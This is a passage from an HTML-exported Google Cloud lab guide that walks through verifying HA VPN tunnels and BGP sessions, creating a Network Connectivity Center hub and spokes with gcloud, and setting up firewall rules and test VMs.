</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">BGP session for tunnel *vpc-b-to-transit-tu2* :</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| BGP session &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; | *vpc-b-to-transit-bgp2* |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| ----------------------------- | ----------------------- |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| Peer ASN &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  | *65000* &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| Cloud Router BGP IPv4 address | 169.254.1.14 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| BGP peer IPv4 address &nbsp; &nbsp; &nbsp; &nbsp; | 169.254.1.13 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">##### **Step 5: Verify the all the VPN connections status from the VPN page**</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- Scroll down the page to confirm that all connections are good.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">![VPN page with all VPN tunnel statuses displaying Established and Bgp session statuses displaying BGP established](https://cdn.qwiklabs.com/QBF07Zii%2ByXoSqxQJHLbXtBlApXTpiIeZTYsGZVP1rU%3D)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Click *Check my progress* to verify the objective.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Create a pair of VPN tunnels between vpc-transit to vpc-a and vpc-b</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Check my progress</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">### Task 4. Create NCC hub resources and attach the HA VPNs as spokes</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">In this section you will create a VPC and create 2 subnets inside that VPC. This will all be done using gcloud CLI commands inside Google Cloud Shell.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Before you can perform any tasks for Network Connectivity Center, you must enable the Network Connectivity API.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">1. From the **Navigation Menu**, search for **API &amp; Services**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">2. Click on **Library**, and search for **Network Connectivity API**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">3. Select the **Network Connectivity API**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">![Network Connectivity API option highlighted in the search results](images/hyB14LnLTAnovI6IC9wDMAoNbXT77qxEZyNIzXnww9Q%3D.png)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">1. Click **Enable**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">2. In this lab `gcloud` commands are used to configure the Network Connectivity Center. In order to authorize Cloud Shell to run the gcloud commands, open the Google Cloud Shell by clicking **Activate Cloud Shell**(![Activate Cloud Shell icon](https://cdn.qwiklabs.com/ep8HmqYGdD%2FkUncAAYpV47OYoHwC8%2Bg0WK%2F8sidHquE%3D)).</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">3. Run the following command to list the active account name:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 8190px;"></div><div class="CodeMirror-gutters" style="display: none; height: 8190px;"></div></div></div></pre><p><span>gcloud auth list</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.96875px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">1. Click **Authorize**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">#### Step 1: Create NCC hub</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- You can click on the "clipboard" icon in the upper right corner of the text box to copy the contents:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 203px;"></div><div class="CodeMirror-gutters" style="display: none; height: 203px;"></div></div></div></pre><p><span>gcloud alpha network-connectivity hubs create transit-hub \</span>
<span>   --description=Transit_hub</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.96875px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">#### Step 2: Create the spoke for branch office 1</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- You can click on the "clipboard" icon in the upper right corner of the text box to copy the contents:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 158px;"></div><div class="CodeMirror-gutters" style="display: none; height: 158px;"></div></div></div></pre><p><span>gcloud alpha network-connectivity spokes create bo1 \</span>
<span>    --hub=transit-hub \</span>
<span>    --description=branch_office1 \</span>
<span>    --vpn-tunnel=transit-to-vpc-a-tu1,transit-to-vpc-a-tu2 \</span>
<span>    --region=Region 1</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.96875px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">#### Step 3: Create the spoke for branch office 2</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- You can click on the "clipboard" icon in the upper right corner of the text box to copy the contents.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 158px;"></div><div class="CodeMirror-gutters" style="display: none; height: 158px;"></div></div></div></pre><p><span>gcloud alpha network-connectivity spokes create bo2 \</span>
<span>    --hub=transit-hub \</span>
<span>    --description=branch_office2 \</span>
<span>    --vpn-tunnel=transit-to-vpc-b-tu1,transit-to-vpc-b-tu2 \</span>
<span>    --region=Region 2</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.96875px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Click *Check my progress* to verify the objective.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Create NCC hub resources and attach the HA VPNs as spokes</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Check my progress</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">### Task 5. Test the setup end to end deploying VMs in the remote branch office VPCs</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">After configuring the hub and its spokes, you should be able to pass traffic from the virtual machine (VM) instance in *branch office1* to the VM instance in *branch office2*. To do this, create a *vpc-a-vm-1* in *vpc-a* and vpc-b-vm-1 in *vpc-b* respectively.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">First, create firewall rules: *fw-a* for *vpc-a-vm-1* in *vpc-a-sub1-use4* subnet and *fw-b* for *vpc-b-vm-1* in *vpc-b-sub1-usw2* subnet respectively to allow ingress SSH and ICMP traffic.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">![Network topology project screen](https://cdn.qwiklabs.com/o5dZVa%2Byv8W3ZZA%2F44UUwlMUXClCGuSQhpERepDFpGI%3D)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">#### Step 1: Create Firewall rule for vpc-a</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">1. In the Cloud Platform Console, click **Navigation menu** (![Navigation menu icon](https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D)) at the top left of the screen.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">2. Then navigate to **VPC network** &gt; **Firewall**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">3. Click on **CREATE FIREWALL RULE** and specify the details as shown.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">![Firewall Rule Creation](images/zau55jMGfANEcN6iYWMuSz8iCdjBuUPyY4yr9dbi2wA%3D.png) ![Firewall Rule Creation](https://cdn.qwiklabs.com/sYV7SXfm3cPA1o%2BCqRqq%2BYnJ%2FvWaFhMl03VXNFETmMk%3D)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">1. Similarly, create firewall rule **fw-b** for **vpc-b**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">#### Step 2: Create VM in vpc-a</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">1. In the **Cloud console**, on the **Navigation menu** (☰), click **Compute Engine** &gt; **VM Instances**, then click **Create instance**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">**Note:** This may take a minute to initialize for the first time.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">There are many parameters you can configure when creating a new instance. Use the following for this lab:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">1. In the **Machine configuration**</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; Enter the values for the following fields:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; | Field &nbsp; &nbsp; &nbsp; | Value &nbsp; &nbsp; &nbsp;  |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; | :---------- | :----------- |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; | **Name** &nbsp;  | `vpc-a-vm-1` |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; | **Region**  | `&lt;Region 1&gt;` |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; | **Zone** &nbsp;  | `&lt;Zone 1&gt;` &nbsp; |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; | **Series**  | `E2` &nbsp; &nbsp; &nbsp; &nbsp; |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; | **Machine** | `e2-medium`  |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">2. Click **OS and storage**</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; Click **Change** to begin configuring your boot disk and select the values for:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; | Field &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  | Value &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; | :------------------- | :-------------------------------------- |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; | **Operating system** | `Debian` &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; | **Version** &nbsp; &nbsp; &nbsp; &nbsp;  | `Debian GNU/Linux 11 (bullseye) x86/64` |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; | **Boot disk type** &nbsp; | `balanced persistent disk` &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; | **Size (GB)** &nbsp; &nbsp; &nbsp;  | `10 GB` &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">3. Click **Networking**</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; - Network interfaces</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; : click on</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 1778px;"></div><div class="CodeMirror-gutters" style="display: none; height: 1778px;"></div></div></div></pre><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> default</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> ```</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 